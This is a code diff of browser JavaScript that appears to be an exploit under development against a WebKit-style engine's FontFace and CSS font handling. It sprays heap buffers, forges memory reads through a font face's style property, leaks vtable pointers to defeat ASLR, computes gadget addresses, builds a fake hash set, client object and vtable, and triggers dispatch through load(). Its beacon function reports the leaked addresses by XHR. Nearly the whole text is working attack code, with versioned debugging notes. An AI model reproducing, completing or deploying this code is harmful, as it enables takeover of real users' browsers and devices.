+        var P1CPS=null,SCPS=[0,0x1F,0x20,0x21],TCPS=[0x40,0x41,0,1];
+        var TA=null,TS=null,TT=null;
+        if(MBUF>0n){
+          /* dynamic plant: the +0x14 window = (band byte-4, 0x40) */
+          var b4v=Number((MBUF>>32n)&0xFFn);
+          var plantQ=(0x40n<<32n)|BigInt(b4v);
+          for(var pi=0;pi<__v688spray.length;pi++){try{dvSetBig(new DataView(__v688spray[pi]),0x98,plantQ);}catch(e5){}}
+          P1CPS=[(b4v>0?b4v-1:0),b4v,0x40,0x41];
+          TA=cResp(MBUF+0x98n,P1CPS);
+          bs('CALA-b4=0x'+b4v.toString(16)+'-'+cTup(TA));
+          var dA=(TA.indexOf(true)>=0)&&(TA.indexOf(false)>=0);
+          if(dA){
+            TS=cResp(MBUF+0xA8n,SCPS);
+            bs('CALS-'+cTup(TS));
+            TT=cResp(MBUF+0xA0n,TCPS);
+            bs('CALT-'+cTup(TT));
+            /* cached-cell try first */
+            try{
+              var cC=BigInt('0x'+(localStorage.getItem('v688_cell')||'0'));
+              if(cC>0x1000000000n&&cMatch(cC+0x14n,TA,P1CPS)&&cMatch(cC+0x1Cn,TS,SCPS)&&cMatch(cC+0x18n,TT,TCPS)){
+                CELLC.push(cC);bs('CELL-CACHED-0x'+cC.toString(16));
+              }
+              if(CELLC.length===0)try{localStorage.removeItem('v688_cell');}catch(e4){}
+            }catch(e){}
+            if(CELLC.length===0){
+              var cs2s=[];for(var cq=0x20;cq<=0xDB;cq++)cs2s.push(cq);
+              cs2s.sort(function(x,y){return Math.abs(x-mRef)-Math.abs(y-mRef);});
+              var cs1s=[];for(var cq1=0;cq1<256;cq1++)cs1s.push(cq1);
+              var cs0s=[0,16,32,48,64,80,96,112,128,144,160,176,192,208,224,240];
+              bs('CSCAN-START-n='+(cs2s.length*cs1s.length*cs0s.length));
+              var cN=0;
+              for(var ci=0;ci<cs2s.length&&CELLC.length<4;ci++){
+                for(var cj=0;cj<cs1s.length&&CELLC.length<4;cj++){
+                  for(var ck4=0;ck4<cs0s.length;ck4++){
+                    var cc=BigInt(cs0s[ck4])|(BigInt(cs1s[cj])<<8n)|(BigInt(cs2s[ci])<<16n)|(BigInt(m4)<<32n);
+                    cN++;
+                    if(cMatch(cc+0x14n,TA,P1CPS)&&cMatch(cc+0x1Cn,TS,SCPS)&&cMatch(cc+0x18n,TT,TCPS)){
+                      CELLC.push(cc);
+                      bs('CELLCAND-0x'+cc.toString(16)+'-n='+cN);
+                      if(CELLC.length>=4)break;
+                    }
+                    if((cN%16384)===0)bs('CSCAN-'+cN);
+                  }
+                }
+              }
+              if(CELLC.length===0)bs('CSCAN-CLEAN-n='+cN);
+              else bs('CSCAN-DONE-cands='+CELLC.length+'-n='+cN);
+            }
+          }else bs('CALA-WEAK');
+        }
+
+        /* --- style-read helpers --- */
+        function restoreAndForge(snap2,daddr,dlen){
+          for(var ib3=0;ib3<window.__sp.length;ib3++){
+            var vb3=window.__sp[ib3];if(!vb3)continue;
+            if(SKIPJ>=0&&ib3===SKIPJ)continue;
+            for(var dd2=0;dd2<SIZE;dd2++)vb3[dd2]=snap2[dd2];
+          }
+          forgeRead(daddr,dlen);
+        }
+
+        /* Remove face from document.fonts BEFORE forgeRead; face.style getter
+         * works without being in the font set and this prevents the layout
+         * engine from dereferencing our modified buffer fields between
+         * forgeRead and readStyle. */
+        bs('DEL-PRE-FORGE');
+        try{document.fonts.delete(faces[zi]);}catch(e){bs('DEL-ERR');}
+        bs('DEL-OK');
+
+        /* --- Immediate hash table read (selfFound=true, before bucket decay) --- */
+        var cachedHT='';
+        var preSnap=new Uint8Array(SIZE);
+        if(bufs.length>0)for(var ps0=0;ps0<SIZE;ps0++)preSnap[ps0]=bufs[0][0][ps0];
+        forgeRead(L1-0x10n,80);
+        try{cachedHT=dec(String(faces[zi].style),128);bs('IHT-ok-'+cachedHT.length);}catch(e){bs('IHT-err');}
+        for(var pr0=0;pr0<window.__sp.length;pr0++){var prv=window.__sp[pr0];if(!prv)continue;if(SKIPJ>=0&&pr0===SKIPJ)continue;for(var pr1=0;pr1<SIZE;pr1++)prv[pr1]=preSnap[pr1];}
+
+        /* --- Step 8: SYNCHRONOUS walk chain ---
+           After IHT, the CSS engine is "poisoned" — any yield point (setTimeout,
+           DOM write via b(), sync XHR via bs()) lets deferred C++ events fire and
+           crash the process. Solution: do ALL readStyle calls in one synchronous
+           JS execution frame with ZERO intermediate beacons or yields. */
+        var snap2=preSnap;
+        var hw='',h2='',h3='',h4='',h5='';
+        var IM=0n,FO=0n,VP=0n;
+        var S0=0n,S1=0n,S2=0n,S3=0n,Q4=0n,R5=0n,R6=0n,R7=0n,S8=0n;
+        var walkOK=false;
+        var raw4='',wt4='';
+
+        if(cachedHT.length>=160){
+          hw=cachedHT;
+
+          /* W1: parse hash table buckets from cached IHT data */
+          var seen=0;
+          for(var gb=2;gb<10;gb++){
+            var hb=hw.slice(gb*16,gb*16+16);
+            if(/^[0-9a-f]{16}$/.test(hb)){
+              var cv=BigInt('0x'+hb.match(/../g).reverse().join(''));
+              if(cv>0x1000000000n&&cv<0xFFFFFFFFFFFFFFFFn){if(seen===SI){IM=cv;break;}seen++;}
+            }
+          }
+
+          if(IM!==0n){
+            /* W2: read WeakPtrImpl+8 → m_ptr (client/CSSFontFaceSet*) — SYNC, no beacon */
+            restoreAndForge(snap2,IM+8n,16);
+            h2=readStyle();
+            var hf=h2.slice(0,16);
+            if(/^[0-9a-f]{16}$/.test(hf)){
+              FO=BigInt('0x'+hf.match(/../g).reverse().join(''));
+            }
+
+            if(FO>0x1000000000n){
+              /* W3: read client object → vtable pointer at +0x00 — SYNC */
+              restoreAndForge(snap2,FO,32);
+              h3=readStyle();
+              var hv=h3.slice(0,16),hz=h3.slice(32,48);
+              if(/^[0-9a-f]{16}$/.test(hv)){
+                VP=BigInt('0x'+hv.match(/../g).reverse().join(''));
+              }
+              if(/^[0-9a-f]{16}$/.test(hz)){
+                var s2=BigInt('0x'+hz.match(/../g).reverse().join(''));
+                if(s2>0x1000000000n&&s2<0x10000000000n)self=s2;
+              }
+
+              if(VP>0x100000000n){
+                /* YIELD: restore safe state, sync XHR to reset CSS engine tick budget */
+                for(var yr=0;yr<window.__sp.length;yr++){
+                  var yrv=window.__sp[yr];if(!yrv)continue;
+                  if(SKIPJ>=0&&yr===SKIPJ)continue;
+                  for(var yr2=0;yr2<SIZE;yr2++)yrv[yr2]=snap2[yr2];
+                }
+                bs('W3-MID');
+
+                /* W4: read ALL vtable slots 0-8 in one 72B read — after yield */
+                restoreAndForge(snap2,VP,72);
+                try{raw4=String(faces[zi].style);}catch(e){raw4='THROW:'+e.message;}
+                h4=dec(raw4,128);
+
+                /* also probe face.weight as alternative property */
+                try{wt4=String(faces[zi].weight);}catch(e){wt4='THROW';}
+
+                if(h4.length>=128){
+                  S0=readLeHex(h4,0);S1=readLeHex(h4,8);S2=readLeHex(h4,16);
+                  S3=readLeHex(h4,24);Q4=readLeHex(h4,32);R5=readLeHex(h4,40);
+                  R6=readLeHex(h4,48);R7=readLeHex(h4,56);S8=readLeHex(h4,64);
+                  walkOK=true;
+                } else {
+                  h5='raw4len='+raw4.length+',raw4='+raw4.slice(0,60);
+                }
+              }
+            }
+          }
+        }
+
+        /* Restore all buffers to safe state BEFORE any beacon */
+        for(var rr=0;rr<window.__sp.length;rr++){
+          var rrv=window.__sp[rr];if(!rrv)continue;
+          if(SKIPJ>=0&&rr===SKIPJ)continue;
+          for(var rr2=0;rr2<SIZE;rr2++)rrv[rr2]=snap2[rr2];
+        }
+
+        /* === NOW safe to beacon — all CSS reads are done === */
+        bs('WALK-hw0='+hw.slice(0,32));
+        bs('WALK-hw1='+hw.slice(32,80));
+        bs('WALK-hw2='+hw.slice(80,128));
+        bs('WALK-hw3='+hw.slice(128,160));
+        bs('WALK-IM='+hex(IM)+',FO='+hex(FO)+',VP='+hex(VP));
+        bs('WALK-h2='+h2.slice(0,40));
+        bs('WALK-h3='+h3.slice(0,64));
+        bs('WALK-h4len='+h4.length+',raw4len='+raw4.length);
+        bs('WALK-raw4='+raw4.slice(0,60));
+        bs('WALK-wt4='+wt4.slice(0,60));
+        bs('WALK-h4='+h4.slice(0,80));
+        bs('WALK-h5='+h5.slice(0,80));
+        if(h4.length>=128)bs('WALK-VT='+h4.slice(0,144));
+        bs('WALK-ok='+walkOK);
+        if(VP>0n){
+          bs('VT-s0='+hex(S0)+',s1='+hex(S1)+',s2='+hex(S2));
+          bs('VT-s3='+hex(S3)+',s4='+hex(Q4)+',s5='+hex(R5));
+          bs('VT-s6='+hex(R6)+',s7='+hex(R7)+',s8='+hex(S8));
+        }
+
+        if(RTT){clearTimeout(RTT);RTT=0;}
+
+        if(!walkOK){
+          bs('WALK-FAIL');
+          verd('bad','WALK FAIL IM='+hex(IM)+' FO='+hex(FO)+' VP='+hex(VP));
+          return;
+        }
+
+        var SAFE=R6;
+
+        if(GT&&Q4===0n){
+          bs('RETRY-GT');
+          if(RT>0){setTimeout(function(){location.href=location.href.replace(/([?&])rt=\d+/,'$1rt='+(RT-1));},60);}
+          return;
+        }
+
+        /* ==== V688 STEP 9: Path B read-only identity + addrof certification ====
+         * Read-only. No vtable forge, no COOP trigger, no m_vector write, no
+         * promise-status writes, no executable-text reads. FO from the WALK is
+         * the IM client object — it is NOT relabelled FontFace. L2 is the
+         * source-derived reclaim-wrapper WeakImpl; FB=qword(L2+8) is only a
+         * source CANDIDATE for the FontFace backend until the identity gates
+         * below certify it. */
+        verd('ok','SELF='+hex(self)+'<br>VP='+hex(VP)+'<br>IM='+hex(IM));
+        setTimeout(function(){
+          if(VP===0n){bs('NOVP');return;}
+          var VP_RVA=0x724DB28n;
+          var BASE=VP-VP_RVA;
+          var PV=BASE+0x724DAC0n;
+          bs('PATHB-vp='+hex(VP)+'-base='+hex(BASE)+'-pv='+hex(PV)+' (source candidates)');
+          var cbq5=0n;   /* V11: JSC-side pointer from the callback wrapper */
+          var pxRawG=''; /* V16: the promise bytes, hoisted for the write test */
+          function readAt(a,len){restoreAndForge(snap2,a,len);return readStyle();}
+          function qAt(h,off){var s=h.slice(off*2,off*2+16);if(!/^[0-9a-f]{16}$/.test(s))return 0n;return BigInt('0x'+s.match(/../g).reverse().join(''));}
+          function canonHeap(p){return p>0x1000000000n&&p<0x10000000000n;}
+          function dumpQ(tag,h,maxB){var n=Math.min(Math.floor(h.length/16),Math.floor(maxB/8));for(var qi=0;qi<n;qi++){bs(tag+'-q'+qi+'=@'+qi*8+'='+hex(qAt(h,qi*8)));}}
+
+          /* --- bounded raw dump around L2 (reclaim wrapper weak impl) --- */
+          bs('L2RAW-PRE-addr='+hex(L2));
+          var l2raw=readAt(L2,64);
+          bs('L2RAW-OK-len='+l2raw.length);
+          dumpQ('L2RAW',l2raw,64);
+
+          /* --- read FB=qword(L2+8) with pre-read beacon --- */
+          bs('FB-PRE-addr='+hex(L2+8n));
+          var fbH=readAt(L2+8n,16);
+          var FB=qAt(fbH,0);
+          bs('FB='+hex(FB));
+          if(!canonHeap(FB)){
+            bs('FACE-IDENTITY-FAIL-FB-not-canonical-heap='+hex(FB));
+            bs('PATHB-STOP-implausible-FB');
+            verd('bad','FB implausible '+hex(FB));
+            return;
+          }
+
+          /* --- bounded <=96B read at FB; report every qword --- */
+          bs('FBRAW-PRE-addr='+hex(FB));
+          var fbRaw=readAt(FB,96);
+          bs('FBRAW-OK-len='+fbRaw.length);
+          dumpQ('FBRAW',fbRaw,96);
+
+          /* V10 REAL LAYOUT (measured on-device, NQ10G2): FontFace wrapper =
+           * { vtable=VP @+0x00, impl-backptr=L2 @+0x08, m_backing=self @+0x10,
+           *   ptr @+0x18, 0 @+0x20, epoch @+0x28, data @+0x30, string-tail }.
+           * The COOP_ANALYSIS.md source estimate (+0x20 secondary VP, +0x28
+           * weak state, +0x30 backing) was WRONG — corrected from evidence. */
+          var fbVtable=qAt(fbRaw,0x00);   /* +0x00 vtable — IS VP (walk-leaked) */
+          var fbWeak=qAt(fbRaw,0x08);     /* +0x08 back-pointer to L2 (mutual with impl+8) */
+          var fbBack=qAt(fbRaw,0x10);     /* +0x10 m_backing → SELF */
+          var fbP18=qAt(fbRaw,0x18);      /* +0x18 canonical-heap candidate (m_loadedPromise?) */
+          bs('FACE-vtable00='+hex(fbVtable)+'-expectVP='+hex(VP)+'-match='+(fbVtable===VP));
+          bs('FACE-weak08='+hex(fbWeak)+'-expectL2='+hex(L2)+'-match='+(fbWeak===L2));
+          bs('FACE-backing10='+hex(fbBack)+'-expectSelf='+hex(self)+'-match='+(fbBack===self));
+          bs('FACE-ptr18='+hex(fbP18)+'-canonHeap='+canonHeap(fbP18));
+          var idOK=(fbVtable===VP)&&(fbWeak===L2)&&(fbBack===self);
+          if(!idOK){
+            bs('FACE-IDENTITY-FAIL');
+            bs('PATHB-STOP-identity-gates-failed');
+            verd('bad','FACE-IDENTITY-FAIL');
+            return;
+          }
+          bs('FACE-IDENTITY-OK');
+
+          /* --- optional proxy inspection (only on certified identity) ---
+           * V10: m_loadedPromise candidate at +0x18 (real layout). */
+          var proxy=fbP18;
+                      bs('PROXY-candidate-FB+0x18='+hex(proxy)+' (measured-layout m_loadedPromise candidate, not p811 proof)');
+          if(!canonHeap(proxy)){
+            bs('PROXY-not-canonical-heap='+hex(proxy));
+            bs('PROMISE-CALLBACK-OWNER-FAIL-no-proxy');
+          }else{
+            bs('PROXYRAW-PRE-addr='+hex(proxy));
+            var pxRaw=readAt(proxy,96);
+            pxRawG=pxRaw;
+            bs('PROXYRAW-OK-len='+pxRaw.length);
+            dumpQ('PROXYRAW',pxRaw,96);
+            var cbWrap=qAt(pxRaw,0);
+            bs('PROXY-cbwrap='+hex(cbWrap));
+            var ownerOK=false;
+            if(canonHeap(cbWrap)){
+              bs('CBWRAP-PRE-addr='+hex(cbWrap));
+              var cbRaw=readAt(cbWrap,64);
+              bs('CBWRAP-OK-len='+cbRaw.length);
+              dumpQ('CBWRAP',cbRaw,64);
+              cbq5=qAt(cbRaw,40);   /* V11: JSC-side pointer candidate */
+              var cn=Math.min(Math.floor(cbRaw.length/16),8);
+              for(var ci=0;ci<cn;ci++){
+                if(qAt(cbRaw,ci*8)===FB){
+                  bs('PROMISE-CALLBACK-OWNER-OK-qindex='+ci+'-addr='+hex(cbWrap+BigInt(ci*8))+'-value='+hex(FB));
+                  ownerOK=true;break;
+                }
+              }
+              if(!ownerOK)bs('PROMISE-CALLBACK-OWNER-FAIL-no-exact-FB-in-callback-wrapper');
+            }else{
+              bs('PROXY-cbwrap-not-canonical-heap='+hex(cbWrap));
+              bs('PROMISE-CALLBACK-OWNER-FAIL-no-callback-wrapper');
+            }
+          }
+          /* Do NOT chase deferred-promise/JSC pointers without exact layouts. */
+
+          /* ==== V11: marker-buffer verification + JSC-region probe ==== */
+          if(MBUF>0n){
+            bs('MBUFVER-PRE-addr='+hex(MBUF));
+            var mvh=readAt(MBUF,32);
+            var me=qAt(mvh,0);
+            bs('MBUFVER-E='+hex(me)+'-match='+(me===0xDEADBEEFCAFEBABEn));
+            if(me===0xDEADBEEFCAFEBABEn){
+              bs('BUFVERIFIED');
+              bs('V11-BUF=0x'+MBUF.toString(16)+'-vector=0x'+(MBUF+0x20n).toString(16));
+            }else{
+              bs('BUFVERIFIED-FAIL');
+              try{localStorage.removeItem('v688_buf');}catch(e3){}
+            }
+          }else bs('MBUF-NOTFOUND');
+          if(cbq5>0x100000000n&&cbq5<0x10000000000n){
+            var jp=(cbq5&~0xFn)-0x20n;
+            bs('JSCPROBE-PRE-addr='+hex(jp));
+            var jh=readAt(jp,128);
+            bs('JSCPROBE-OK-len='+jh.length);
+            dumpQ('JSCRAW',jh,128);
+          }else bs('JSCPROBE-SKIP-no-pointer');
+          /* ==== V11 END ==== */
+
+          // v31 Patch: THE FIXED FORGE + the council ladder (born | weak | d0 | d1)
+//
+// ROOT CAUSE (council-verified): put32(sv,off,val) used INTEGER-INDEX
+// ASSIGNMENT on a DataView — a silent NO-OP (creates own properties on the
+// wrapper; backing store untouched). Every V24-V28 run shipped the marker
+// spray's ORIGINAL metadata: keyCount = 0x13579BDF = 324,508,639. The engine:
+// removeIf scanned tableSize=0 buckets (nothing), then computeSize() returned
+// 324,508,639 and the WeakHashSet Mapper's reserveInitialCapacity(324M*8)
+// demanded ~2.6 GB → fatal allocation failure → the identical LOAD-PRE
+// "memory warning" death in EVERY arm. No dispatch/removal/promise/timer
+// difference ever manifested. THE FIX: sv.setUint32(off, val, true).
+//
+// THE LADDER (council-approved, ?arm= selects):
+//   born : keyCount=0, all buckets empty. Pure machinery test (empty cleanup,
+//          empty iteration, both transitions, timer stop). Expect RETURN,
+//          status 4, op-count(face+0x60)=0, metadata {0,0,3,4} unchanged.
+//   weak : keyCount=1, bucket[0]=impl, impl.m_ptr=0. removeIf REMOVES the
+//          entry (~Ref -> deref on our impl copy: rc 3->2, no destroy),
+//          writes the deleted marker + keyCount 1->0 into OUR buffer, empty
+//          iteration. Expect RETURN, op-count=0, bucket=0xFFFF..., meta {1,0,3,4}.
+//   d0   : keyCount=1, bucket[0]=impl, impl.m_ptr=S+0x50 (fake client).
+//          ALL 8 vtable slots = NOPG. One full no-op dispatch (plus virtual
+//          ref/deref at +0x30/+0x38 if virtual on this fork — covered either
+//          way). Expect RETURN, status 4, op-count=1, meta {0,1,3,4} unchanged.
+//   d1   : d0 but slot3 (+0x18) = the REAL fontStateChanged gadget (FSG).
+//          The first REAL dispatch: Loading (gadget: break), then Failure
+//          (gadget: real-promise path). Expect RETURN + dispatch witness.
+//
+// GATES (council-mandated, all via DataView methods / Uint8Array reads,
+// NO readAt after craft, NO integer-index reads on sv — they would read the
+// shadow properties and false-pass):
+//   G1: metadata exact-hex vs the arm's expected 16-byte string
+//       born:  00000000000000000300000004000000
+//       others:00000000010000000300000004000000
+//       + explicit marker-A-gone negative control
+//   G2: face+0x58 == S+0x30
+//   G3: face+0x60/+0x64 == 0 (template counters unchanged)
+//   G4: sources vector +0x48..0x57 ALL ZERO (hard abort if not)
+//   G5: status=0, override=1, timer vptr!=0, thread!=0, fire times=0,
+//       heapItem=0 (predicated — abort on any wrong value)
+// A failed gate = NO load().
+//
+// WITNESS: one composite post-load beacon (status, op-count, metadata hex,
+// buckets, impl rc, timer sanity, promise pre/post) + the forge diff.
+
+/* ==== v31: THE FIXED FORGE ==== */
+
+try{
+  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
+    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
+    var mIdx=-1;
+    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
+    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
+    bs('V31-TAG-mIdx='+mIdx);
+
+    if(mIdx>=0&&mIdx<32){
+      var sv=new DataView(window.__v688.spray[mIdx]);
+      var S=MBUF;
+      var hitBuf=bufs[0][0];
+
+      var ARM=(function(){var m=/[?&]arm=(born|weak|d0a|d0b|d0|d1)/.exec(location.search);return m?m[1]:'born';})();
+      bs('V31-ARM='+ARM);
+
+      /* ---- STEP 1: ALL readAt FIRST ---- */
+      var promiseAddr=qAt(readAt(FB+0x18n,8),0);
+      bs('V31-PROMISE-ADDR='+hex(promiseAddr));
+      var promiseBefore=readAt(promiseAddr,0x30);
+      bs('V31-PROMISE-BEFORE='+promiseBefore);
+
+      bs('V31-SIBLING-SCAN');
+      var sib=0n, sibBk=0n;
+      for(var sa=FB-0x2000n;sa<FB+0x2000n&&sib===0n;sa+=8n){
+        var q0h=readAt(sa,8);
+        if(qAt(q0h,0)===VP){
+          var bkH=readAt(sa+0x10n,8);
+          var bk=qAt(bkH,0);
+          if(bk>0x1000000000n&&bk!==S&&bk!==FB&&bk!==self&&bk<0x10000000000n){sib=sa;sibBk=bk;}
+        }
+      }
+      if(sibBk===0n){bs('V31-NO-SIBLING');verd('err','v31 no sibling');throw 'no sibling';}
+      bs('V31-SIBLING='+hex(sib)+'-backing='+hex(sibBk));
+
+      var timerH=readAt(sibBk+0x88n,0x38);
+      bs('V31-TIMER-BORROWED='+timerH);
+
+      /* ---- STEP 2: build the FORGE (METADATA VIA setUint32 - THE FIX) ---- */
+      bs('V31-FORGE-BUILD');
+
+      /* impl = real L2 byte-copy; m_ptr per arm */
+      for(var ib=0;ib<0x20;ib++)sv.setUint8(ib,parseInt(l2raw.substr(ib*2,2),16));
+      if(ARM==='weak')        dvSetBig(sv,0x08,0n);        /* null client -> entry removed */
+      else if(ARM==='d0a')    dvSetBig(sv,0x08,FB);         /* the REAL FontFace wrapper -> real vtable, real everything */
+      else if(ARM==='d0'||ARM==='d1'||ARM==='d0b')dvSetBig(sv,0x08,S+0x50n); /* fake client */
+      else                    dvSetBig(sv,0x08,0n);        /* born: unreferenced anyway */
+      var implRcBefore=sv.getUint32(0x00,true);
+      bs('V31-IMPL-rc='+implRcBefore+'-m_ptr='+hex(dvGetBig(sv,0x08)));
+
+      /* *** THE FIX: metadata via DataView.setUint32 (put32 was a NO-OP!) *** */
+      sv.setUint32(0x20, 0, true);                 /* deletedCount = 0 */
+      sv.setUint32(0x24, (ARM==='born')?0:1, true);/* keyCount: 0 born, else 1 */
+      sv.setUint32(0x28, 3, true);                 /* tableSizeMask = 3 */
+      sv.setUint32(0x2C, 4, true);                 /* tableSize = 4 */
+
+      /* buckets */
+      if(ARM==='born'){
+        dvSetBig(sv,0x30,0n); dvSetBig(sv,0x38,0n);
+        dvSetBig(sv,0x40,0n); dvSetBig(sv,0x48,0n);
+      }else{
+        dvSetBig(sv,0x30,S);                       /* bucket[0] = impl */
+        dvSetBig(sv,0x38,0n); dvSetBig(sv,0x40,0n); dvSetBig(sv,0x48,0n);
+      }
+
+      /* client = real wrapper byte-copy (used by d0/d0b/d1; unreferenced otherwise)
+       * d0a uses the REAL wrapper at FB (m_ptr=FB) - no copy involved.
+       * d0b keeps the copy's +0x00 = the REAL vtable pointer (UNPATCHED)
+       *      -> dispatches run the REAL FontFace methods on the fake client. */
+      for(var cb=0;cb<0x40;cb++)sv.setUint8(0x50+cb,parseInt(fbRaw.substr(cb*2,2),16));
+      if(ARM==='d0'||ARM==='d1')dvSetBig(sv,0x50+0x00,S+0x90n); /* fake vtable */
+      /* d0b: leave client+0x00 = the real VP (from fbRaw) */
+      /* client+0x18 promise deliberately kept = the REAL promise (fbRaw copy) */
+      var clientPromise=dvGetBig(sv,0x50+0x18);
+      bs('V31-CLIENT-PROMISE='+hex(clientPromise)+(clientPromise===promiseAddr?'-IS-REAL-OK':'-MISMATCH'));
+      if(ARM==='d0b')bs('V31-CLIENT-VT-REAL='+hex(dvGetBig(sv,0x50)));
+
+      /* vtable */
+      for(var vs=0;vs<8;vs++)dvSetBig(sv,0x90+vs*8,NOPG);
+      if(ARM==='d1')dvSetBig(sv,0x90+0x18,FSG);    /* slot3 = real fontStateChanged */
+
+      bs('V31-FORGE-BUILT-T='+(S+0x30n).toString(16)+'-slot3='+hex(dvGetBig(sv,0x90+0x18)));
+
+      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
+
+      /* ---- STEP 3: craft the FACE ---- */
+      bs('V31-FACE-CRAFT');
+      for(var sz=0x28;sz<=0x47;sz++)hitBuf[sz]=0;
+      /* +0x48..0x57: the SOURCES VECTOR — poisoned by the read-carrier
+       * (G4 in the first run read 3f/65/0x824/46 = scan-grid garbage;
+       * m_sources.size() at +0x54 was 0x46 = 70 phantom sources!). MUST
+       * be zeroed so pump sees an empty vector. */
+      for(var sz2=0x48;sz2<=0x57;sz2++)hitBuf[sz2]=0;
+      /* +0x60..0x67: the WeakHashSet counters — also poisoned by the
+       * read-carrier (G3 read 0x8c00000055). Zero them in the FACE craft
+       * (runs after all readAt). */
+      for(var c2=0x60;c2<=0x67;c2++)hitBuf[c2]=0;
+      hitBuf[0x82]=0;                              /* status = Pending */
+      hitBuf[0x83]=1;                              /* sourcesPopulated */
+      hitBuf[0x87]=1;                              /* override = Block */
+      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
+      for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(timerH.substr(tb*2,2),16);
+      for(var hz=0x98;hz<0xA8;hz++)hitBuf[hz]=0;   /* fire times = 0 */
+      for(var hz2=0xA8;hz2<0xB0;hz2++)hitBuf[hz2]=0;/* heapItem = NULL */
+
+      /* ---- STEP 4: install (LAST write) ---- */
+      for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);
+
+      /* ---- STEP 5: GATES ---- */
+      var gatesOK=true;
+      function hx(u8){var s='';for(var i=0;i<u8.length;i++)s+=('0'+u8[i].toString(16)).slice(-2);return s;}
+
+      /* G1: metadata exact-hex (DataView reads only) */
+      var g1bytes=[];for(var g1=0;g1<16;g1++)g1bytes.push(sv.getUint8(0x20+g1));
+      var g1hex=g1bytes.map(function(x){return ('0'+x.toString(16)).slice(-2);}).join('');
+      var expectHex=(ARM==='born')?'00000000000000000300000004000000':'00000000010000000300000004000000';
+      bs('V31-G1-meta-hex='+g1hex+'-expect='+expectHex);
+      var g1d0=sv.getUint32(0x20,true),g1kc=sv.getUint32(0x24,true),g1m=sv.getUint32(0x28,true),g1s=sv.getUint32(0x2C,true);
+      bs('V31-G1-dwords-d='+g1d0+'-kc='+g1kc+'-mask='+g1m+'-size='+g1s);
+      if(g1hex!==expectHex){gatesOK=false;bs('V31-G1-FAIL');}
+      if(g1d0===0x02468ACE||g1kc===0x13579BDF){gatesOK=false;bs('V31-G1-FAIL-MARKER-A-STILL-PRESENT');}
+
+      /* G2: face+0x58 */
+      var g2=0n;for(var g2b=0;g2b<8;g2b++)g2|=BigInt(hitBuf[0x58+g2b])<<BigInt(g2b*8);
+      bs('V31-G2-face58='+hex(g2));
+      if(g2!==(S+0x30n)){gatesOK=false;bs('V31-G2-FAIL');}
+
+      /* G3: face counters unchanged */
+      var g3=0n;for(var g3b=0;g3b<8;g3b++)g3|=BigInt(hitBuf[0x60+g3b])<<BigInt(g3b*8);
+      bs('V31-G3-face60='+hex(g3));
+      if(g3!==0n){gatesOK=false;bs('V31-G3-FAIL');}
+
+      /* G4: sources vector all zero (hard abort if dirty) */
+      var g4dirty=false;for(var g4=0x48;g4<0x58;g4++)if(hitBuf[g4]!==0)g4dirty=true;
+      bs('V31-G4-sources='+hx(hitBuf.slice(0x48,0x58)));
+      if(g4dirty){gatesOK=false;bs('V31-G4-FAIL-SOURCES-DIRTY');}
+
+      /* G5: status/override/timer PREDICATED */
+      var g5vptr=0n;for(var q9=0;q9<8;q9++)g5vptr|=BigInt(hitBuf[0x90+q9])<<BigInt(q9*8);
+      var g5thread=0n;for(var q10=0;q10<8;q10++)g5thread|=BigInt(hitBuf[0xB0+q10])<<BigInt(q10*8);
+      var g5heap=0n;for(var q11=0;q11<8;q11++)g5heap|=BigInt(hitBuf[0xA8+q11])<<BigInt(q11*8);
+      var g5fire=0n;for(var q12=0;q12<16;q12++)g5fire|=BigInt(hitBuf[0x98+q12])<<BigInt(q12*8);
+      bs('V31-G5-status='+hitBuf[0x82]+'-ovr='+hitBuf[0x87]+'-vptr='+hex(g5vptr)+'-thread='+hex(g5thread)+'-heap='+hex(g5heap)+'-fire='+hex(g5fire));
+      if(!(hitBuf[0x82]===0&&hitBuf[0x87]===1&&g5vptr!==0n&&g5thread!==0n&&g5heap===0n&&g5fire===0n)){
+        gatesOK=false;bs('V31-G5-FAIL');
+      }
+
+      if(!gatesOK){
+        bs('V31-GATE-FAIL-ABORT-NO-LOAD');
+        verd('err','v31 gate fail - load() NOT called');
+      }else{
+        bs('V31-GATES-ALL-OK');
+
+        /* ---- STEP 6: THE DISPATCH ---- */
+        bs('V31-LOAD-PRE');
+        var loadReturned=false;
+        try{
+          faces[zi].load();
+          loadReturned=true;
+          bs('V31-LOAD-RETURNED');
+        }catch(e){
+          bs('V31-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
+        }
+
+        /* ---- STEP 7: COMPOSITE WITNESS (one beacon) ---- */
+        var opcnt=hitBuf[0x60]|(hitBuf[0x61]<<8)|(hitBuf[0x62]<<16)|(hitBuf[0x63]<<24);
+        var postMeta='';for(var pm=0;pm<16;pm++)postMeta+=('0'+sv.getUint8(0x20+pm).toString(16)).slice(-2);
+        var postBk0=dvGetBig(sv,0x30);
+        var postRc=sv.getUint32(0x00,true);
+        var postVt=hitBuf[0x90]!==0;
+        bs('V31-WIT-status='+hitBuf[0x82]+'-opcount='+opcnt+'-meta='+postMeta+'-bk0='+hex(postBk0)+'-implrc='+postRc+'-timerVptrOK='+postVt);
+
+        try{bs('V31-JS-STATUS='+faces[zi].status);}catch(e){bs('V31-JS-STATUS-ERR');}
+
+        /* promise witness (readAt safe now) */
+        var promiseAfter=readAt(promiseAddr,0x30);
+        if(promiseAfter!==promiseBefore)bs('WIT-V31-PROMISE-CHANGED');
+        else bs('WIT-V31-PROMISE-UNCHANGED');
+
+        /* forge diff */
+        var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
+        var diffs=[];
+        for(var wq=0;wq<0x100;wq+=8){
+          var cur=0n,old=0n;
+          for(var wb=0;wb<8;wb++){
+            cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
+            old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
+          }
+          if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
+        }
+        if(diffs.length)bs('WIT-V31-FORGE-WRITE-'+diffs.slice(0,10).join('|'));
